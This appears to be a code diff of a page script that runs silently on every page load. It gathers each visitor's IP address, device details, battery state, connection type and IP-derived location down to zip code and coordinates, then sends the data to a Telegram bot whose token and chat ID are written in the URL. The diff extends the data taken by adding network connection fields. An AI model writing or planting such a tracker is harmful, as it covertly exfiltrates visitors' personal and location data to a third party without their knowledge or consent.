@@ -9,7 +9,11 @@ function myFunction() {
             const ipAddress = ipData.ip;
             const userAgent = navigator.userAgent;
             const deviceMemory = navigator.deviceMemory;
-            
+
+            // Get network information
+            const connectionType = navigator.connection.type;
+            const effectiveConnectionType = navigator.connection.effectiveType;
+
             // Get battery information
             navigator.getBattery().then(batteryData => {
                 const batteryLevel = batteryData.level * 100; // Battery level in percentage
@@ -29,7 +33,7 @@ function myFunction() {
                         const timezone = geoData.timezone;
                         const isp = geoData.org;
 
-                        const text = encodeURIComponent(`${currentURL} Url Detect New Users ipAddress: ${ipAddress}\nDevice Info: ${userAgent}\nDevice Memory: ${deviceMemory} GB\nBattery Level: ${batteryLevel}%\nBattery Status: ${charging}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nZip Code: ${zip}\nLatitude: ${latitude}\nLongitude: ${longitude}\nTimezone: ${timezone}\nISP: ${isp}`);
+                        const text = encodeURIComponent(`${currentURL} Url Detect New Users ipAddress: ${ipAddress}\nDevice Info: ${userAgent}\nDevice Memory: ${deviceMemory} GB\nConnection Type: ${connectionType}\nEffective Connection Type: ${effectiveConnectionType}\nBattery Level: ${batteryLevel}%\nBattery Status: ${charging}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nZip Code: ${zip}\nLatitude: ${latitude}\nLongitude: ${longitude}\nTimezone: ${timezone}\nISP: ${isp}`);
 
                         const apiUrl = `https://api.telegram.org/bot6684189805:AAE8G0b3d2V9nQML6xlFwwLM8RXS0ea9RN4/sendMessage?chat_id=5114789651&text=${text}`;
                         fetch(apiUrl)
@@ -52,4 +56,5 @@ function myFunction() {
 }
 
 window.addEventListener('load', myFunction);
-                          </script>
+
+</script>
